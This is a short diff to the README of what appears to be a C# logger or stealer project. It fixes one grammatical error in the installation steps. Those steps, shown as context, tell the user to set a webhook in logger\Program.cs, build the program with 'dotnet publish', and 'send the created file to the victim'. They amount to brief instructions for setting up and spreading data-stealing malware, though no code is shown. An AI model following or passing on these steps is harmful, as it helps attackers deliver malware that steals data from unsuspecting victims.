@@ -7,7 +7,7 @@
 
 
 ## installation: 
-1. Export the project into an folder
+1. Export the project into a folder
 2. edit the webhook in \logger\Program.cs
 3. run cmd in the folder and run the command `dotnet publish`
 4. send the created file to the victim!
